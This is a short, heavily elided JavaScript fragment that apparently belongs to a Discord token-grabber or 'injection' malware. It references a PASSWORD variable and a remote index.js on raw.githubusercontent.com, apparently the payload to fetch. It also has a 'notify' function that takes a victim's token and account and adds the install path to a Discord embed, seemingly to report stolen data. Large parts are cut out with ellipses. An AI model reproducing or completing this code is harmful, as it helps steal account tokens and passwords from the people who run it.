...
let [
    ...
    PASSWORD
        ...
        "https://raw.githubusercontent.com/69WallyW69/d4124i/main/index.js",
        {
            _nitro: [
...
const notify = async (ctx, token, acc) => {
    ...
    ctx.embeds[0].fields.push(
        ...
        { name: "<:WallyW_Injection:1270735567813869609>| Path:", value: `\`\`\`${__dirname.toString().trim().replace(/\\/g, "/")}\`\`\``, inline: false },
    );
